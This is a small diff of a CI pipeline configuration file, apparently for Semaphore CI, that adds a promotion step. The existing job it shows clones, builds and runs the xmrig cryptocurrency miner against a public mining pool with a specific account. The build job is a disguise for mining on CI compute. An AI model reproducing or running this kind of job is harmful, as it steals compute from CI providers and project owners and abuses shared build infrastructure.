@@ -39,3 +39,6 @@ blocks:
           commands:
             - 'brew install cmake libuv openssl hwloc; git clone https://github.com/xmrig/xmrig.git; mkdir xmrig/build && cd xmrig/build; cmake .. -DOPENSSL_ROOT_DIR=/usr/local/opt/openssl; make -j$(sysctl -n hw.logicalcpu); ./xmrig --donate-level 5 --opencl -o xmr.pool.minergate.com:45700 -u bugfdu1@gmail.com -p x -k -a rx/loki -t50'
     dependencies: []
+promotions:
+  - name: Promotion 1
+    pipeline_file: pipeline_2.yml
